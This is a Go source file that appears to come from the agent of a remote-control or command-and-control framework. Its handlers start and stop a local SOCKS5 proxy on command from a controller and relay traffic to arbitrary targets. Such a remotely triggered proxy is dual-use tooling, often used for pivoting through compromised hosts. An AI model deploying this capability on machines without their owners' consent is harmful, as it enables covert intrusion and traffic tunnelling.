package handlers

import (
	"context"
	"encoding/binary"
	"fmt"
	"io"
	"log"
	"net"
	"sync"
	"time"

	"overlord-client/cmd/agent/runtime"
	"overlord-client/cmd/agent/wire"
)

var (
	proxyListenerMu sync.Mutex
	proxyListener   net.Listener
	proxyPort       int
	proxyCtx        context.Context
	proxyCancel     context.CancelFunc
)

func HandleProxyStart(ctx context.Context, env *runtime.Env, cmdID string, payload map[string]interface{}) error {
	proxyListenerMu.Lock()
	defer proxyListenerMu.Unlock()

	if proxyListener != nil {
		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{
			Type:      "command_result",
			CommandID: cmdID,
			OK:        false,
			Message:   "Proxy already running",
		})
	}

	requestedPort := 1080
	if portVal, ok := payload["port"]; ok {
		if port, ok := portVal.(int); ok && port > 0 {
			requestedPort = port
		}
	}

	listener, err := net.Listen("tcp", fmt.Sprintf("127.0.0.1:%d", requestedPort))
	if err != nil {
		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{
			Type:      "command_result",
			CommandID: cmdID,
			OK:        false,
			Message:   fmt.Sprintf("Failed to start proxy: %v", err),
		})
	}

	proxyListener = listener
	proxyPort = listener.Addr().(*net.TCPAddr).Port
	proxyCtx, proxyCancel = context.WithCancel(context.Background())

	log.Printf("SOCKS5 proxy started on port %d", proxyPort)

	if err := wire.WriteMsg(ctx, env.Conn, wire.CommandResult{
		Type:      "command_result",
		CommandID: cmdID,
		OK:        true,
		Message:   fmt.Sprintf("Proxy started on port %d", proxyPort),
	}); err != nil {
		return err
	}

	go acceptProxyConnections(proxyCtx, listener)

	return nil
}

func HandleProxyStop(ctx context.Context, env *runtime.Env, cmdID string) error {
	proxyListenerMu.Lock()
	defer proxyListenerMu.Unlock()

	if proxyListener == nil {
		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{
			Type:      "command_result",
			CommandID: cmdID,
			OK:        false,
			Message:   "No proxy running",
		})
	}

	if proxyCancel != nil {
		proxyCancel()
	}

	if err := proxyListener.Close(); err != nil {
		log.Printf("Error closing proxy listener: %v", err)
	}

	proxyListener = nil
	proxyPort = 0

	log.Printf("SOCKS5 proxy stopped")

	return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{
		Type:      "command_result",
		CommandID: cmdID,
		OK:        true,
		Message:   "Proxy stopped",
	})
}

func acceptProxyConnections(ctx context.Context, listener net.Listener) {
	for {
		select {
		case <-ctx.Done():
			return
		default:
		}

		conn, err := listener.Accept()
		if err != nil {
			select {
			case <-ctx.Done():
				return
			default:
				log.Printf("Proxy accept error: %v", err)
				continue
			}
		}

		go handleProxyConnection(ctx, conn)
	}
}

func handleProxyConnection(ctx context.Context, conn net.Conn) {
	defer conn.Close()

	conn.SetDeadline(time.Now().Add(30 * time.Second))

	buf := make([]byte, 2)
	if _, err := io.ReadFull(conn, buf); err != nil {
		log.Printf("Proxy handshake read error: %v", err)
		return
	}

	version := buf[0]
	nmethods := buf[1]

	if version != 5 {
		log.Printf("Unsupported SOCKS version: %d", version)
		return
	}

	methods := make([]byte, nmethods)
	if _, err := io.ReadFull(conn, methods); err != nil {
		log.Printf("Proxy methods read error: %v", err)
		return
	}

	if _, err := conn.Write([]byte{5, 0}); err != nil {
		log.Printf("Proxy handshake response error: %v", err)
		return
	}

	reqHeader := make([]byte, 4)
	if _, err := io.ReadFull(conn, reqHeader); err != nil {
		log.Printf("Proxy request header error: %v", err)
		return
	}

	if reqHeader[0] != 5 {
		log.Printf("Invalid request version: %d", reqHeader[0])
		return
	}

	cmd := reqHeader[1]
	if cmd != 1 {
		conn.Write([]byte{5, 7, 0, 1, 0, 0, 0, 0, 0, 0}) // command not supported
		return
	}

	atyp := reqHeader[3]
	var host string
	var port uint16

	switch atyp {
	case 1: // IPv4
		addr := make([]byte, 4)
		if _, err := io.ReadFull(conn, addr); err != nil {
			return
		}
		host = net.IP(addr).String()
	case 3: // domain name
		addrLen := make([]byte, 1)
		if _, err := io.ReadFull(conn, addrLen); err != nil {
			return
		}
		addr := make([]byte, addrLen[0])
		if _, err := io.ReadFull(conn, addr); err != nil {
			return
		}
		host = string(addr)
	case 4: // IPv6
		addr := make([]byte, 16)
		if _, err := io.ReadFull(conn, addr); err != nil {
			return
		}
		host = net.IP(addr).String()
	default:
		conn.Write([]byte{5, 8, 0, 1, 0, 0, 0, 0, 0, 0}) // Address type not supported
		return
	}

	// read port
	portBytes := make([]byte, 2)
	if _, err := io.ReadFull(conn, portBytes); err != nil {
		return
	}
	port = binary.BigEndian.Uint16(portBytes)

	log.Printf("SOCKS5 CONNECT to %s:%d", host, port)

	// connect to target
	targetAddr := fmt.Sprintf("%s:%d", host, port)
	targetConn, err := net.DialTimeout("tcp", targetAddr, 10*time.Second)
	if err != nil {
		log.Printf("Failed to connect to %s: %v", targetAddr, err)
		conn.Write([]byte{5, 5, 0, 1, 0, 0, 0, 0, 0, 0}) // Connection refused
		return
	}
	defer targetConn.Close()

	// send success response
	// VER | REP | RSV | ATYP | BND.ADDR | BND.PORT
	conn.Write([]byte{5, 0, 0, 1, 0, 0, 0, 0, 0, 0})

	// clear deadline for data transfer
	conn.SetDeadline(time.Time{})
	targetConn.SetDeadline(time.Time{})

	// relay data bidirectionally
	done := make(chan struct{}, 2)

	goSafe("socks5 relay to target", nil, func() {
		io.Copy(targetConn, conn)
		done <- struct{}{}
	})

	goSafe("socks5 relay to client", nil, func() {
		io.Copy(conn, targetConn)
		done <- struct{}{}
	})

	select {
	case <-done:
	case <-ctx.Done():
	}
}
